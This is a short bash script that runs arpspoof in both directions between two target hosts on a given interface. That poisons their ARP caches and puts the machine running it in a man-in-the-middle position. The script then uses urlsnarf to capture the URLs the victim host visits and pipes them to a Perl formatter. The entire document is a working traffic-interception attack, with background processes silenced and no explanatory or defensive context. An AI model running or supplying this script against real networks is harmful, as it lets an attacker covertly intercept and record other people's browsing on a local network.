#! /bin/bash

if [ $# -ne 3 ]; then
	exit 1;
fi

arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
urlsnarf -i $1 -v "." "host $2" | perl fmt.pl;
